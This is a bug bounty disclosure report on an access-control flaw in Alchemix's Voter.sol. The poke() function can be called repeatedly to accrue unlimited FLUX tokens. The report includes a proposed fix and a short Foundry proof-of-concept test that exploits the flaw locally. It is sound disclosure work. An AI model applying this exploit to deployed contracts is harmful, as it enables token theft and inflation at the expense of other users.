# 31375 - \[SC - Critical] Lack of Access control in poke function allows ...

Submitted on May 17th 2024 at 17:45:04 UTC by @hulkvision for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31375

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* A user can mint unlimited flux token breaking the invariant `A user should never be able to claim more rewards than they have earned`

## Description

## Brief/Intro

Lack of Access control in `poke()` function allows unlimited accrual of flux token thus breaking assumed invariants set by the team.

## Vulnerability Details

In `Voter.sol` users can perform action like vote, reset or poke , when these actions are performed an external call to `FluxToken.sol` `accrueFlux` function is called which accrue unclaimed flux for a given veALCX . While `vote` and `reset` function had modifier called `onlyNewEpoch` which prevented calling `accrueFlux` function multiple times in an epoch. `poke` function was also calling `accrueFlux` function but in this function no access control modifier `onlyNewEpoch` was used which allowed this function to be called multiple time in an epoch.

In `Voter.sol`

```solidity
function poke(uint256 _tokenId) public {
    //...//
        _vote(_tokenId, _poolVote, _weights, _boost); //internal _vote is called 
    }
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
      //...
        IFluxToken(FLUX).accrueFlux(_tokenId);  // flux is accrued here
        uint256 totalPower = (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost);
}
```

## Impact Details

* This vulnerability is breaking a invariant set by the team , as a user can accrue unlimited flux, they can use the accrued flux to boost their voting power each epoch thus getting more voting power than they should have.

> A user should never be able to vote with more power than they have

* A user can mint unlimited flux token and can unlock their escrowed position at any time they want even before then are supposed to unlock or can sell those flux token in the marketplace
* Due to unlimited supply of flux token the value of flux token will drop significantly.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L195-211> <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L423>

## Possible fix

```diff
+ bool public hasPoked; // create a state variable
function poke(uint256 _tokenId) public {
+      hasPoked = true;
        uint256 _boost = 0;

        //...//

        _vote(_tokenId, _poolVote, _weights, _boost);
+      hasPoked = false;
    }
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
        //.../
+        if (!hasPoked) { // when poke is called flux accrual will not happen.
+           IFluxToken(FLUX).accrueFlux(_tokenId); 
+        }
        //...//
}
```

## Proof of Concept

* Add this function to `src/test/Voting.t.sol` and run the test `forge test --mt testPocAccrueFluxMultipleTimes --rpc-url $RPC_URL -vvvv`

```
function testPocAccrueFluxMultipleTimes() public {
        uint256 tokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, true);
        address[] memory pools = new address[](1);
        pools[0] = alETHPool;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        hevm.startPrank(admin);
        voter.vote(tokenId, pools, weights, 0);
        voter.poke(tokenId); // 1st time
        console.log("unclaimed flux balance",flux.getUnclaimedFlux(tokenId));
        voter.poke(tokenId); // 2nd time
        uint256 unclaimedFlux_1 = flux.getUnclaimedFlux(tokenId);
        voter.poke(tokenId); // 3rd time
        uint256 unclaimedFlux_2 = flux.getUnclaimedFlux(tokenId);
        console.log("increased flux balance",flux.getUnclaimedFlux(tokenId));
        assertGt(unclaimedFlux_2,unclaimedFlux_1);
    }
```
